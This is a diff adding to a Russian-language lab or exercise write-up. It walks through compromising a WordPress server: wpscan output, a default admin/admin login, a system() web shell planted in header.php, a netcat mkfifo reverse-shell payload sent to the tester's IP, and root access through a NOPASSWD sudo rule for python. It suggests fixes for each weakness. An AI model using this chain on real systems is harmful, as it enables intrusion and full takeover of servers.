@@ -400,3 +400,124 @@ Sitemap: http://10.31.2.10/wp-sitemap.xml
   }
 }
 ```
+- Результаты работы wpscan
+```shell
+$ wpscan --url 10.31.2.10                  
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+ 
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.20
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+ 
+[+] URL: http://10.31.2.10/ [10.31.2.10]
+[+] Started: Thu Mar 10 13:43:21 2022
+ 
+Interesting Finding(s):
+ 
+[+] Headers
+ | Interesting Entry: Server: nginx/1.14.2
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+ 
+[+] robots.txt found: http://10.31.2.10/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+ 
+[+] XML-RPC seems to be enabled: http://10.31.2.10/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+ 
+[+] WordPress readme found: http://10.31.2.10/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ 
+[+] The external WP-Cron seems to be enabled: http://10.31.2.10/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+ 
+[+] WordPress version 5.9.1 identified (Latest, released on 2022-02-22).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.31.2.10/feed/, <generator>https://wordpress.org/?v=5.9.1</generator>
+ |  - http://10.31.2.10/comments/feed/, <generator>https://wordpress.org/?v=5.9.1</generator>
+ 
+[+] WordPress theme in use: twentytwentyone
+ | Location: http://10.31.2.10/wp-content/themes/twentytwentyone/
+ | Last Updated: 2022-01-25T00:00:00.000Z
+ | Readme: http://10.31.2.10/wp-content/themes/twentytwentyone/readme.txt
+ | [!] The version is out of date, the latest version is 1.5
+ | Style URL: http://10.31.2.10/wp-content/themes/twentytwentyone/style.css?ver=1.3
+ | Style Name: Twenty Twenty-One
+ | Style URI: https://wordpress.org/themes/twentytwentyone/
+ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.31.2.10/wp-content/themes/twentytwentyone/style.css?ver=1.3, Match: 'Version: 1.3'
+ 
+[+] Enumerating All Plugins (via Passive Methods)
+ 
+[i] No plugins Found.
+```
+
+# Получение админских привелегий на Wordpress
+
+Заходим на http://10.31.2.10/wp-scan и пробуем брутить логин\пароль. Подходит логин `admin` и пароль `admin`. 
+Заходим в админку и выбираем Appearence -> Theme File Editor и открываем header.php.
+Вставляем `echo system($_REQUEST['lol'])`, чтобы получить Remote Code Execution в системе.
+![](https://i.imgur.com/2IcJHFB.png)
+
+И теперь получаем reverse shell:
+1) `nc -lnvp 1234` на машине
+2) Делаем запрос на сайт со следующим пейлоадом: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.31.5.11 1234 >/tmp/f`, где `10.31.5.11` - наш ip, полученный с помощью ip addr. (http://10.31.2.10/?lol=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.31.5.11%201234%20%3E%2Ftmp%2Ff)
+
+Возможный фикс: сменить пароль и логин в админке Вордпресса на более безопасный, используя большие и маленькие буквы, специальные символы(`$`, `'` и тп) и цифры. Например, логин - `MasterVan`, пароль - `G00dM^rn1ngSl$v3$$` 
+
+# Privilege escalation on wordpress server
+Запустим `python -c 'import pty; pty.spawn("/bin/bash")'` , чтобы получить bash. 
+Теперь нужно поднять привелегии до root:
+1) Запустим `cat /etc/sudoers` , чтобы получить список исполнуяемых файлов, которые могут быть запущены из под рута без введения пароля. Такой находится: `www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python` (www-data - user, под которым мы находимся сейчас). 
+3) Запустим `sudo /usr/bin/python` , пароля от нас не требуют. Сменим пароль для пользователя root:
+```python
+>>> import os
+>>> os.system('id')
+uid=0(root) gid=0(root) groups=0(root)
+>>> os.system('passwd')
+New password: aboba
+passwd: password changed successfully
+>>> exit()
+```
+> Позднее заменим пароль на более безопастный
+
+3) Запускаем `su`, вводим новый пароль для рута (aboba) и получаем shell от пользователя root.
+
+Возможный фикс: удалить строчку `www-data ALL=(ALL:ALL) NOPASSWD: /usr/bin/python` из /etc/sudoers
+
+Для удобства прокинули ssh на машину, добавив в `/etc/ssh/sshd_config` строчку `PermitRootLogin yes` и запустили `service sshd restart`, чтобы изменения пришли в силу.
+> Позже запретим подключение по SSH к руту строчкой `PermitRootLogin no`, так как это рождает уязвимость
+
+---
